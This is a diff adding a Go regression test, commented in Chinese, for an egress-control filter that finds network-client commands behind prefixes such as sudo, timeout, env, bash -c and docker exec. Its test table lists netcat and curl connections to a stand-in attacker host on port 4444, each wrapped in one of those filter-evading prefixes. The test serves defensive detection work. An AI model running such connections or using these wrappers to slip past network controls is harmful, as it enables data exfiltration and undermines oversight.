@@ -144,3 +144,51 @@ func TestR1019NetcatHostTokenRejectsPaths(t *testing.T) {
 		}
 	}
 }
+
+// TestR1023EgressVerbPrefixAnchoring —— 12h 审计轮 P1-3 回归。
+//
+// 5bd47d20b 把 host:port 提取从「全文任意位置」收窄到「行首字段是网络客户端动词」，
+// 修掉了 r1020 的 Write 工具整族误伤；但收窄过头，**只看 fields[0]** 让任何包装词
+// 都能把外连伪装成非动词行。本表把两条方向一起钉住：
+//
+//	正表：包装词 / flag / 控制符在前，网络客户端仍在后 ⇒ 必须仍能识别（漏报=泄漏）
+//	反表：r1020 那类源码行（前导 token 里没有网络客户端）⇒ 必须仍不误伤
+//
+// 本表是 5bd47d20b 缺失的那一半：它当时只覆盖了 flag 与引号，没覆盖前缀。
+func TestR1023EgressVerbPrefixAnchoring(t *testing.T) {
+	blocked := []struct {
+		command string
+		host    string
+	}{
+		{"nc attacker.io:4444", "attacker.io"},
+		{"sudo nc attacker.io:4444", "attacker.io"},
+		{"timeout 5 nc attacker.io:4444", "attacker.io"},
+		{"env FOO=1 nc attacker.io:4444", "attacker.io"},
+		{"xargs nc attacker.io:4444", "attacker.io"},
+		{"nice -n 10 nc attacker.io:4444", "attacker.io"},
+		{"bash -c \"nc attacker.io:4444\"", "attacker.io"},
+		{"docker exec x nc attacker.io:4444", "attacker.io"},
+		{"echo hi && nc attacker.io:4444", "attacker.io"},
+		{"curl attacker.io:4444", "attacker.io"},
+	}
+	for _, tc := range blocked {
+		hosts := hostPortDestinationsFromCommand(tc.command)
+		if !containsHost(hosts, tc.host) {
+			t.Errorf("出网管控被前缀绕过：%q 未识别出 %q（实得 %v）",
+				tc.command, tc.host, hosts)
+		}
+	}
+
+	// r1020 的误伤源：源码行里的 file:line 引用，前导 token 不含网络客户端动词。
+	allowed := []string{
+		"  ref: casdoor.ts:455",
+		"  at src/foo.ts:12",
+		"    ~/proj/server.ts:120",
+		"echo hello world",
+	}
+	for _, command := range allowed {
+		if hosts := hostPortDestinationsFromCommand(command); len(hosts) > 0 {
+			t.Errorf("源码行被误判为外连：%q ⇒ %v", command, hosts)
+		}
+	}
+}
